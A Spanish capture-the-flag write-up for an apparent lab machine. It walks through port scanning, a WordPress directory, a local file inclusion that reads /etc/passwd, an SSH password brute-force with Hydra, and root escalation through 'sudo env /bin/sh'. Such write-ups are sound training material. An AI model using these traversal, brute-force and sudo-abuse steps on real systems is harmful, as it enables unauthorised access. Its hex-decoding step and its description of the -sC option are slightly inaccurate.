# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/29014b67-1433-4f9f-b02b-7cf8e7add5cb)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 9.6p1 (Ubuntu)
2.  **80/tcp(HTTP):** Apache httpd 2.4.58

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Y se encontró la pagina por defecto de Apache2 Ubuntu.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a15883b4-4785-4930-830f-6a6cdafb324b)

# Fase 2- Exploración

#### FeroxBuster
```python
301      GET        9l       28w      312c http://172.18.0.2/wordpress => http://172.18.0.2/wordpress/
200      GET       22l      105w     5952c http://172.18.0.2/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://172.18.0.2/
200      GET      363l      961w    10671c http://172.18.0.2/index.html
```
Feroxbuster nos encontró que existe un directorio llamado wordpres.

#### Wordpress
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7b243292-6534-4859-8a95-ca6acd557e7f)

Dentro de la pagina nos dice que podemos cambiar la información y cosas así, es una pagina web en pañales.
Al revisar el codigo nos encontramos con un comentario interesante:
```python
<!-- El desarollo de esta web esta en fase verde muy verde te dejo aqui la ventana abierta con mucho love para los curiosos que gustan de leer -->
```

#### index.php
```
200      GET       40l      115w     1048c http://172.18.0.2/wordpress/index.php
```
Encontramos con feroxbuster un index.php dentro de wordpress, no cambia en nada la pagina, sigue siendo lo mismo.

# Fase 3- Explotación

#### LFI
```python
> sudo wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd" --hc 404 --hl 40

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000002045:   200        66 L     148 W      2319 Ch     "love"  
```
Como no había nada mas para revisar, probe hacer un LFI con wfuzz al parametro index.php. Y nos encontró la palabra `love`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/dcc6a070-7d71-4b6f-8ac6-88b652526716)
La probamos y funciono. Estamos leyendo archivos internos de la maquina. Vemos 2 posibles usuarios para ssh, `pedro` y `rosa`.

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9cb6eee5-83df-4abe-ba2e-1f9ff41bd640)
Realizamos un ataque de diccionario al usuario `rosa` en el puerto ssh, y encontramos su contraseña `lovebug`.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b0354416-b5b4-4769-bf93-47579e793559)
Despues de realizar el tratamiento de la TTY, al realizar el comando `sudo -l` vemos que tenemos permisos de ejecución de `ls` y `cat`.

#### ls y cat
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c193e0cf-248f-49a0-b6f8-b2bad9056fce)

Como tenemos permisos vemos que dentro del directorio `/root/`, hay un archivo llamado `secret.txt`.
El archivo contiene lo siguiente:
```python
4E 5A 58 57 43 59 33 46 4F 4A 32 47 43 34 54 42 4F 4E 58 58 47 32 49 4B
```
Es un mensaje codificado en hexadecimal, me dirigí a la pagina web [https://gchq.github.io/CyberChef/] Para ver que es el mensaje y es esto:
```python
noacertarasosi
```

Esta contraseña era contraseña del usuario pedro y no del usuario root.
```python
> whoami
> Rosa
> su root
Password:noacertarasosi
su: Authentication failure
> su pedro
Password:noacertarasosi
> whoami
> pedro
```

#### Pedro
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/194b4476-b456-4fb6-9c07-d61d83eafa20)
Somos el usuario pedro y tenemos permisos de ejecución del binario env.
```python
sudo env /bin/sh
```
Para escalar solamente hay que ejecutar este comando y listo, somos root!



